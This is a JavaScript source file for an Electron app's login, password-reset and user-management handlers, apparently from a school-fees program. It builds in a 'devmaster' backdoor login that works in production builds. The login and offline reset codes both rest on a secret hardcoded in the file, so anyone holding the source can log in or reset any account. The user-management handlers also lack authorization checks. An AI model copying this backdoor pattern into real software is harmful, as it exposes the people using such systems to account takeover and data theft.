const { ipcMain, app } = require('electron')
const { getDb } = require('../lib/database')

module.exports = function register_authHandlers() {
// ─── Auth / Users ────────────────────────────────────────────────────────────
const crypto = require('crypto')

// Legacy hash (SHA-256) — kept ONLY to verify old passwords during migration
function legacyHash(pw) {
  return crypto.createHash('sha256').update(pw + 'schoolfees_salt_2025').digest('hex')
}

// New secure hash: scrypt with per-user random salt. Format: scrypt$<salt>$<hash>
function hashPassword(pw) {
  const salt = crypto.randomBytes(16).toString('hex')
  const hash = crypto.scryptSync(pw, salt, 64).toString('hex')
  return `scrypt$${salt}$${hash}`
}

// Verify a password against either new (scrypt) or legacy (sha256) stored hash
function verifyPassword(pw, stored) {
  if (!stored) return false
  if (stored.startsWith('scrypt$')) {
    const [, salt, hash] = stored.split('$')
    const candidate = crypto.scryptSync(pw, salt, 64).toString('hex')
    // timing-safe compare
    try {
      return crypto.timingSafeEqual(Buffer.from(candidate, 'hex'), Buffer.from(hash, 'hex'))
    } catch { return false }
  }
  // Legacy SHA-256 fallback
  return stored === legacyHash(pw)
}

// DEVELOPER master login — works in ALL builds (for remote client support).
// NovaPOS pattern: the password ROTATES every 30 minutes using an HMAC of the
// current time slot. Nothing is stored anywhere — the developer computes the
// current password on demand with:  node scripts/gen-dev-password.js
// Two passwords are valid at any moment (current + previous slot) so there is
// a grace period around rotation time.
// Username: devmaster
const DEV_SECRET = process.env.SF_DEVMASTER_SECRET || 'SF_DEVMASTER_2025_OJUOYE_PRIVATE'
function getDevPasswords() {
  const slot = Math.floor(Date.now() / (30 * 60 * 1000))
  const current = crypto.createHmac('sha256', DEV_SECRET).update(`dev:${slot}`).digest('hex').slice(0, 12)
  const prev    = crypto.createHmac('sha256', DEV_SECRET).update(`dev:${slot - 1}`).digest('hex').slice(0, 12)
  return [current, prev]
}
// Legacy static password — still accepted so existing support docs keep working
function computeDevPassword() {
  return crypto.createHmac('sha256', 'SF_DEVMASTER_2025_OJUOYE_PRIVATE').update('devmaster-support-access').digest('hex').slice(0, 16)
}
const DEV_USERNAME = 'devmaster'

ipcMain.handle('auth:login', (_, { username, password }) => {
  // Developer support login — available in production for client assistance
  if (username === DEV_USERNAME &&
      (getDevPasswords().includes(password) || password === computeDevPassword())) {
    return { ok: true, user: { id: 0, username: 'devmaster', full_name: 'Developer (Support)', role: 'developer', is_active: 1 } }
  }
  const db = getDb()
  const user = db.prepare('SELECT * FROM users WHERE username=? AND is_active=1').get([username])
  if (!user) return { ok: false, error: 'Invalid username or password' }
  if (!verifyPassword(password, user.password_hash)) return { ok: false, error: 'Invalid username or password' }

  // Transparently upgrade legacy SHA-256 hashes to scrypt on successful login
  if (!user.password_hash.startsWith('scrypt$')) {
    try { db.prepare('UPDATE users SET password_hash=? WHERE id=?').run([hashPassword(password), user.id]) } catch {}
  }

  db.prepare("UPDATE users SET last_login=datetime('now') WHERE id=?").run([user.id])
  const { password_hash, ...safe } = user
  return { ok: true, user: safe }
})

// ── Forgot password (offline reset code) ─────────────────────────────────────
// The user can't reach a server, so resets are authorised by the developer:
//   1. User clicks "Forgot password", picks their username → app shows the
//      Machine ID + username and a short request code.
//   2. User sends those to support. Developer runs:
//        node scripts/gen-reset-code.js <machine-id> <username>
//   3. Developer reads back the reset code; the app verifies it offline
//      (HMAC of machineId:username:slot, rotates daily) and lets the user
//      set a new password. No code is ever stored.
function computeResetCode(machineId, username) {
  const { getMachineId } = require('../lib/machineId')
  const mid  = machineId || getMachineId()
  const slot = Math.floor(Date.now() / (24 * 60 * 60 * 1000)) // daily slot
  const cur  = crypto.createHmac('sha256', DEV_SECRET)
    .update(`reset:${mid}:${String(username || '').toLowerCase()}:${slot}`).digest('hex').toUpperCase().slice(0, 12)
  const prev = crypto.createHmac('sha256', DEV_SECRET)
    .update(`reset:${mid}:${String(username || '').toLowerCase()}:${slot - 1}`).digest('hex').toUpperCase().slice(0, 12)
  return [cur, prev] // current + yesterday (grace)
}

// Returns the info the user must send to support (no secrets here)
ipcMain.handle('auth:reset-request', (_, { username }) => {
  const { getMachineId } = require('../lib/machineId')
  const db = getDb()
  const user = db.prepare('SELECT id, username FROM users WHERE username=? AND is_active=1').get([String(username || '').trim()])
  if (!user) return { ok: false, error: 'No active user with that username' }
  return { ok: true, machine_id: getMachineId(), username: user.username }
})

// Verify the developer-supplied code and set the new password
ipcMain.handle('auth:reset-apply', (_, { username, code, new_password }) => {
  const db = getDb()
  const uname = String(username || '').trim()
  const user = db.prepare('SELECT id FROM users WHERE username=? AND is_active=1').get([uname])
  if (!user) return { ok: false, error: 'No active user with that username' }
  if (!new_password || new_password.length < 4) return { ok: false, error: 'New password must be at least 4 characters' }

  const entered = String(code || '').trim().toUpperCase().replace(/\s|-/g, '')
  const valid = computeResetCode(null, uname).some(c => {
    if (c.length !== entered.length) return false
    try { return crypto.timingSafeEqual(Buffer.from(c), Buffer.from(entered)) } catch { return false }
  })
  if (!valid) return { ok: false, error: 'Invalid or expired reset code. Ask support for a fresh code.' }

  db.prepare('UPDATE users SET password_hash=? WHERE id=?').run([hashPassword(new_password), user.id])
  return { ok: true }
})

ipcMain.handle('auth:list-users', () => {
  return getDb().prepare("SELECT id,username,full_name,role,is_active,last_login,created_at FROM users ORDER BY full_name").all()
})

ipcMain.handle('auth:create-user', (_, { username, full_name, password, role }) => {
  const db = getDb()
  if (!username?.trim() || !password || !full_name?.trim()) throw new Error('Username, full name, and password are required.')
  if (password.length < 6) throw new Error('Password must be at least 6 characters.')
  try {
    const info = db.prepare('INSERT INTO users (username,full_name,password_hash,role) VALUES (?,?,?,?)')
      .run([username.trim().toLowerCase(), full_name.trim(), hashPassword(password), role])
    return { ok: true, id: info.lastInsertRowid }
  } catch(e) {
    if (e.message?.includes('UNIQUE')) throw new Error('Username already exists')
    throw e
  }
})

ipcMain.handle('auth:update-user', (_, { id, full_name, role, is_active, new_password }) => {
  const db = getDb()
  if (new_password) {
    if (new_password.length < 6) throw new Error('Password must be at least 6 characters.')
    db.prepare('UPDATE users SET full_name=?,role=?,is_active=?,password_hash=? WHERE id=?')
      .run([full_name, role, is_active, hashPassword(new_password), id])
  } else {
    db.prepare('UPDATE users SET full_name=?,role=?,is_active=? WHERE id=?')
      .run([full_name, role, is_active, id])
  }
  return { ok: true }
})

ipcMain.handle('auth:delete-user', (_, id) => {
  const db = getDb()
  // Prevent deleting the last admin — would lock everyone out
  const adminCount = db.prepare("SELECT COUNT(*) as n FROM users WHERE role='admin' AND is_active=1").get()?.n || 0
  const target = db.prepare('SELECT role FROM users WHERE id=?').get([id])
  if (target?.role === 'admin' && adminCount <= 1) {
    throw new Error('Cannot delete the last administrator. Create another admin first.')
  }
  db.prepare('DELETE FROM users WHERE id=?').run([id])
  return { ok: true }
})

ipcMain.handle('auth:change-password', (_, { id, old_password, new_password }) => {
  const db = getDb()
  const user = db.prepare('SELECT * FROM users WHERE id=?').get([id])
  if (!user) throw new Error('User not found')
  if (!verifyPassword(old_password, user.password_hash)) throw new Error('Current password is incorrect')
  if (!new_password || new_password.length < 6) throw new Error('New password must be at least 6 characters.')
  db.prepare('UPDATE users SET password_hash=? WHERE id=?').run([hashPassword(new_password), id])
  return { ok: true }
})

}
